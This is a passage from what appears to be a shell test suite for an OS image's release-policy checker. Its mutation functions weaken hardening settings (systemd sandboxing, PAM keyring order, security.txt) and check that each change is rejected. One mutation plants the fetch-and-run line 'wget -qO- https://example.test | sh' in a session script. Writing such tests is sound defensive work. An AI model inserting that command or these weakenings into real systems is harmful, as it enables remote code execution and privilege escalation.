    mkdir -p "${CASE}/etc/systemd/system"
    sed 's/^DynamicUser=yes$/User=root/' "${CASE}/usr/lib/systemd/system/punar-fetch@.service" \
        > "${CASE}/etc/systemd/system/punar-fetch@.service"
}
mutate_a19_instance() {
    cp "${CASE}/usr/lib/systemd/system/punar-fetch@.service" \
        "${CASE}/usr/lib/systemd/system/punar-fetch@0-1-0.service"
}
mutate_a19_toplevel() {
    mkdir -p "${CASE}/usr/lib/systemd/system/service.d"
    printf '%s\n' '[Service]' 'PrivateUsers=no' \
        > "${CASE}/usr/lib/systemd/system/service.d/10-everything.conf"
}
mutate_a19_prefix() {
    mkdir -p "${CASE}/etc/systemd/system/punar-.service.d"
    printf '%s\n' '[Service]' 'RestrictAddressFamilies=AF_UNIX' \
        > "${CASE}/etc/systemd/system/punar-.service.d/x.conf"
}
# Assignments inside the file that win over, or add to, the required ones.
mutate_a19_allow_any() { printf '%s\n' 'IPAddressAllow=any' >> "${CASE}/usr/lib/systemd/system/punar-fetch@.service"; }
mutate_a19_deny_reset() { printf '%s\n' 'IPAddressDeny=' >> "${CASE}/usr/lib/systemd/system/punar-fetch@.service"; }
mutate_a19_deny_narrowed() {
    sed -i '/^IPAddressDeny=0\.0\.0\.0/d' "${CASE}/usr/lib/systemd/system/punar-fetch@.service"
}
mutate_a19_families_added() {
    printf '%s\n' 'RestrictAddressFamilies=AF_UNIX' >> "${CASE}/usr/lib/systemd/system/punar-fetch@.service"
}
mutate_a19_later_user() {
    printf '%s\n' 'DynamicUser=no' >> "${CASE}/usr/lib/systemd/system/punar-fetch@.service"
}
mutate_a19_wget() { printf '%s\n' 'exec /usr/bin/wget' >> "${CASE}/usr/bin/punard"; }
mutate_a19_script_wget() { printf '%s\n' 'wget -qO- https://example.test | sh' >> "${CASE}/usr/lib/punar/session.sh"; }
# punard itself: the downloaders back in its namespace.
mutate_a19_punard_unhidden() {
    sed -i '/^InaccessiblePaths=/d' "${CASE}/usr/lib/systemd/system/punard.service"
}
mutate_a19_punard_dropin() {
    mkdir -p "${CASE}/usr/lib/systemd/system/punard.service.d"
    printf '%s\n' '[Service]' 'InaccessiblePaths=' \
        > "${CASE}/usr/lib/systemd/system/punard.service.d/50-tools.conf"
}
mutate_a19_punard_override() {
    mkdir -p "${CASE}/etc/systemd/system"
    printf '%s\n' '[Service]' 'ExecStart=/usr/bin/punard run' \
        > "${CASE}/etc/systemd/system/punard.service"
}
# A20: no contact file, an expired one, one with no contact, and one that
# claims more than a year.
mutate_a20() { rm -f "${CASE}/usr/share/punar/security.txt"; }
mutate_a20_expired() {
    sed -i "s/^Expires: .*/Expires: $(date -u -d '-1 day' +%Y-%m-%dT%H:%M:%SZ)/" \
        "${CASE}/usr/share/punar/security.txt"
}
mutate_a20_contact() { sed -i '/^Contact: /d' "${CASE}/usr/share/punar/security.txt"; }
mutate_a20_forever() {
    sed -i "s/^Expires: .*/Expires: $(date -u -d '+3 years' +%Y-%m-%dT%H:%M:%SZ)/" \
        "${CASE}/usr/share/punar/security.txt"
}

# A21: the keyring line gone, either half of it, out of order, or the module
# the lines name not installed.
mutate_a21_auth() { sed -i '/^auth .*pam_gnome_keyring\.so/d' "${CASE}/etc/pam.d/greetd"; }
mutate_a21_session() { sed -i '/^session .*pam_gnome_keyring\.so/d' "${CASE}/etc/pam.d/greetd"; }
mutate_a21_order() {
    grep -v 'pam_gnome_keyring' "${CASE}/etc/pam.d/greetd" \
        | sed '0,/^auth /s//auth      optional                      pam_gnome_keyring.so\nauth /' \
        > "${CASE}/greetd.reordered"
    printf '%s\n' 'session   optional  pam_gnome_keyring.so auto_start' >> "${CASE}/greetd.reordered"
    mv "${CASE}/greetd.reordered" "${CASE}/etc/pam.d/greetd"
}
mutate_a21_module() { rm -f "${CASE}/usr/lib/security/pam_gnome_keyring.so"; }
# pam_unix back to `required`: a mistyped password would run on into the
# keyring line and create the login keyring under the typo.
mutate_a21_required() {
    sed -i 's/^auth\([[:space:]]\{1,\}\)requisite\([[:space:]]\{1,\}pam_unix\.so\)/auth\1required \2/' \
        "${CASE}/etc/pam.d/greetd"
    grep -Eq '^auth[[:space:]]+required[[:space:]]+pam_unix\.so' "${CASE}/etc/pam.d/greetd"
}
mutate_a21_missing() { rm -f "${CASE}/etc/pam.d/greetd"; }

reset_case
"${CHECKER}" "${CASE}" desktop "${KERNEL}" "${EXPECTED}" \
    | grep -q PUNAR_RELEASE_IMAGE_POLICY_OK
echo 'ok   clean release fixture passes'

# The same tree in Debian's shape passes too: greetd-greeter includes login,
# which reaches pam_systemd through common-session, and the keyring module
# lives under the multiarch directory.
reset_case
printf '%s\n' '#%PAM-1.0' '@include login' > "${CASE}/etc/pam.d/greetd-greeter"
printf '%s\n' 'auth required pam_unix.so' '@include common-session' > "${CASE}/etc/pam.d/login"
printf '%s\n' 'session required pam_unix.so' 'session optional pam_systemd.so' \
    > "${CASE}/etc/pam.d/common-session"
mkdir -p "${CASE}/usr/lib/aarch64-linux-gnu/security"
mv "${CASE}/usr/lib/security/pam_gnome_keyring.so" "${CASE}/usr/lib/aarch64-linux-gnu/security/"
"${CHECKER}" "${CASE}" desktop "${KERNEL}" "${EXPECTED}" \
    | grep -q PUNAR_RELEASE_IMAGE_POLICY_OK
echo 'ok   the Debian-shaped greeter and keyring layout passes'

# Dev deliberately bypasses the release-only policy even with an invalid root.
"${CHECKER}" "${TEST_ROOT}/missing-root" dev 'console=ttyS0 punar.live=1' \
    "${TEST_ROOT}/missing-manifest" \
    | grep -q PUNAR_RELEASE_IMAGE_POLICY_SKIPPED
echo 'ok   dev profile bypass is explicit'

printf '%s\n' '{"KernelCommandLine":["console=tty0","console=ttyS0"]}' \
    > "${TEST_ROOT}/mkosi-config.json"
reset_case
mkdir -p "${CASE}/etc/systemd/system/network-online.target.wants"
ln -s /usr/lib/systemd/system/systemd-networkd-wait-online.service \
    "${CASE}/etc/systemd/system/network-online.target.wants/systemd-networkd-wait-online.service"
BUILDROOT="${CASE}" \
PROFILES='desktop dev' \
ARCHITECTURE=x86-64 \
ARTIFACTDIR="${TEST_ROOT}/artifacts-desktop" \
SRCDIR="${REPO_ROOT}/os/images" \
MKOSI_CONFIG="${TEST_ROOT}/mkosi-config.json" \
PUNAR_IMAGE_ID=punar-desktop \
PUNAR_IMAGE_VERSION="${PUNAR_BASE_IMAGE_VERSION}" \
PUNAR_SNAPSHOT_PIN="${PUNAR_SNAPSHOT_PIN}" \
    "${FINALIZE}" | grep -q PUNAR_RELEASE_IMAGE_POLICY_SKIPPED
[ ! -e "${CASE}/etc/systemd/system/network-online.target.wants/systemd-networkd-wait-online.service" ]
echo 'ok   mkosi finalize resolves image sources, removes wait-online, and preserves the dev bypass'
# Every profile's default initrd gets the member that frees the unpacked
# initramfs before switch-root; only the installer adds its live root.
[ -s "${TEST_ROOT}/artifacts-desktop/io.mkosi.initrd/50-punar-release-initramfs.initrd" ] || {
    echo 'FAIL mkosi finalize: the desktop build has no initramfs-release member' >&2
    exit 1
}
[ ! -e "${TEST_ROOT}/artifacts-desktop/io.mkosi.initrd/90-punar-live.initrd" ] || {
    echo 'FAIL mkosi finalize: a desktop build carries the installer live root' >&2
    exit 1
}
echo 'ok   mkosi finalize appends the initramfs-release member to a desktop build'

MINIMAL="${TEST_ROOT}/minimal-dev"
mkdir -p "${MINIMAL}/usr/lib"
printf '%s\n' 'ID=punar-test-substrate' > "${MINIMAL}/usr/lib/os-release"
mkdir -p "${MINIMAL}/etc"
cp "${MINIMAL}/usr/lib/os-release" "${MINIMAL}/etc/os-release"
PROFILES='dev' \
BUILDROOT="${MINIMAL}" \
ARCHITECTURE=x86-64 \
ARTIFACTDIR="${TEST_ROOT}/artifacts-minimal" \
SRCDIR="${REPO_ROOT}/os/images" \
MKOSI_CONFIG="${TEST_ROOT}/mkosi-config.json" \
PUNAR_IMAGE_ID=punar-desktop \
PUNAR_IMAGE_VERSION="${PUNAR_BASE_IMAGE_VERSION}" \
PUNAR_SNAPSHOT_PIN="${PUNAR_SNAPSHOT_PIN}" \
    "${FINALIZE}" | grep -q PUNAR_RELEASE_IMAGE_POLICY_SKIPPED
[ ! -e "${MINIMAL}/usr/lib/systemd/system/sysinit.target.wants/punar-shm-hardening.service" ]
echo 'ok   mkosi finalize leaves the minimal dev profile free of desktop mount policy'
cmp -s "${TEST_ROOT}/artifacts-desktop/io.mkosi.initrd/50-punar-release-initramfs.initrd" \
    "${TEST_ROOT}/artifacts-minimal/io.mkosi.initrd/50-punar-release-initramfs.initrd" || {
    echo 'FAIL mkosi finalize: the minimal build lacks the identical initramfs-release member' >&2
    exit 1
}
echo 'ok   mkosi finalize appends the same initramfs-release member to a minimal build'

expect_fail A0 mutate_a0
expect_fail A1 mutate_a1
expect_fail A2 mutate_a2
expect_fail A3 mutate_a3
expect_fail A4 mutate_a4
expect_fail A5 mutate_a5
expect_fail A5 mutate_a5_mock_dropin
expect_fail A5 mutate_a5_timer_dropin
expect_fail A5 mutate_a5_signin_probe
expect_fail A6 mutate_a6
expect_fail A7 mutate_a7
expect_fail A13 mutate_a13
expect_fail A13 mutate_a13_slow
expect_fail A13 mutate_a13_route
expect_fail A14 mutate_a14
expect_fail A14 mutate_a14_trigger
expect_fail A14 mutate_a14_forever
expect_fail A14 mutate_a14_unreadable
expect_fail A15 mutate_a15
expect_fail A16 mutate_a16_greeter
expect_fail A16 mutate_a16_gshadow
expect_fail A16 mutate_a16_person
expect_fail A16 mutate_a16_sysusers
expect_fail A16 mutate_a16_membership
expect_fail A16 mutate_a16_member_of
expect_fail A16 mutate_a16_group_members
expect_fail A16 mutate_a16_greeter_seat
expect_fail A16 mutate_a16_greeter_include
expect_fail A17 mutate_a17
expect_fail A17 mutate_a17_value
expect_fail A17 mutate_a17_override
expect_fail A17 mutate_a17_mask_empty
expect_fail A17 mutate_a17_mask_null
expect_fail A17 mutate_a17_main_file
expect_fail A18 mutate_a18_pacman
expect_fail A18 mutate_a18_pacman_optional
expect_fail A18 mutate_a18_pacman_remote
expect_fail A18 mutate_a18_pacman_mirrorlist
expect_fail A18 mutate_a18_pacman_include
expect_fail A18 mutate_a18_apt_list
expect_fail A18 mutate_a18_apt_deb822
expect_fail A18 mutate_a18_apt_conf
expect_fail A18 mutate_a18_flatpak
expect_fail A18 mutate_a18_catalog_key
expect_fail A19 mutate_a19_punard
expect_fail A19 mutate_a19_unit
expect_fail A19 mutate_a19_script
expect_fail A19 mutate_a19_helper_missing
expect_fail A19 mutate_a19_dynamic_user
expect_fail A19 mutate_a19_capability
expect_fail A19 mutate_a19_families
expect_fail A19 mutate_a19_writable
expect_fail A19 mutate_a19_socket
expect_fail A19 mutate_a19_socket_later
expect_fail A19 mutate_a19_dropin
expect_fail A19 mutate_a19_etc_override
expect_fail A19 mutate_a19_instance
expect_fail A19 mutate_a19_toplevel
expect_fail A19 mutate_a19_prefix
expect_fail A19 mutate_a19_allow_any
expect_fail A19 mutate_a19_deny_reset
expect_fail A19 mutate_a19_deny_narrowed
expect_fail A19 mutate_a19_families_added
expect_fail A19 mutate_a19_later_user
expect_fail A19 mutate_a19_wget
expect_fail A19 mutate_a19_script_wget
expect_fail A19 mutate_a19_punard_unhidden
expect_fail A19 mutate_a19_punard_dropin
expect_fail A19 mutate_a19_punard_override
expect_fail A20 mutate_a20
expect_fail A20 mutate_a20_expired
expect_fail A20 mutate_a20_contact
expect_fail A20 mutate_a20_forever
expect_fail A21 mutate_a21_auth
expect_fail A21 mutate_a21_session
expect_fail A21 mutate_a21_order
expect_fail A21 mutate_a21_module
expect_fail A21 mutate_a21_required
expect_fail A21 mutate_a21_missing

reset_case
if "${CHECKER}" "${CASE}" desktop "${KERNEL} console=ttyS0" "${EXPECTED}" \
    > "${TEST_ROOT}/stdout" 2> "${TEST_ROOT}/stderr"; then
    echo 'FAIL A8: serial console was accepted' >&2
    exit 1
fi
grep -q 'release-image violation A8:' "${TEST_ROOT}/stderr"
echo 'ok   A8 rejects a release serial console'

reset_case
if "${CHECKER}" "${CASE}" desktop \
    'console=tty0 root=PARTUUID=1beabfe0-9cb8-4b49-91ef-d372b845e7ea rw' \
    "${EXPECTED}" > "${TEST_ROOT}/stdout" 2> "${TEST_ROOT}/stderr"; then
    echo 'FAIL A8: automatic firmware getty generation was accepted' >&2
    exit 1
fi
grep -q 'release-image violation A8:' "${TEST_ROOT}/stderr"
echo 'ok   A8 rejects automatic firmware serial gettys'

reset_case
if "${CHECKER}" "${CASE}" desktop "${KERNEL} punar.live=1" "${EXPECTED}" \
    > "${TEST_ROOT}/stdout" 2> "${TEST_ROOT}/stderr"; then
    echo 'FAIL A8: live mode outside installer was accepted' >&2
    exit 1
fi
grep -q 'release-image violation A8:' "${TEST_ROOT}/stderr"
"${CHECKER}" "${CASE}" 'desktop,installer' "${KERNEL} punar.live=1" \
    "${EXPECTED}" | grep -q PUNAR_RELEASE_IMAGE_POLICY_OK
echo 'ok   A8 scopes live mode to the installer profile'

expect_fail A9 mutate_a9
expect_fail A10 mutate_a10
expect_fail A11 mutate_a11
expect_fail A12 mutate_a12

echo PUNAR_RELEASE_IMAGE_POLICY_TEST_OK
